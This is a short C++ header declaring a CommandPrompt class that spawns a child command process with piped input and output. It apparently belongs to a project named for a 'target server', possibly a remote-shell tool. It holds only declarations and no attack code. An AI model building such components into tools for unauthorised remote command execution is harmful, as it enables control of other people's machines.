//
// Created by Berlingot on 2023-04-17.
////reference https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx

#ifndef SERVEUR___CIBLE_COMMANDPROMPT_H
#define SERVEUR___CIBLE_COMMANDPROMPT_H

#include "client.h"
#include "Running.h"

class CommandPrompt {
public: //Public functions
    CommandPrompt(std::string path);
    static void cmdThread(void* pvPath);

    std::string readCMD();
    void writeCMD(std::string command);

public:	//Public variables
    static CommandPrompt * cmdptr;
    static bool cmdOpen;

private: //Private functions
    void createChildProcess(std::string path);

private:	//variables
    HANDLE g_hChildStd_IN_Rd = NULL;
    HANDLE g_hChildStd_IN_Wr = NULL;
    HANDLE g_hChildStd_OUT_Rd = NULL;
    HANDLE g_hChildStd_OUT_Wr = NULL;

    static HANDLE g_hChildProcess;
    static HANDLE g_hChildThread;


    SECURITY_ATTRIBUTES saAttr;
};


#endif //SERVEUR___CIBLE_COMMANDPROMPT_H
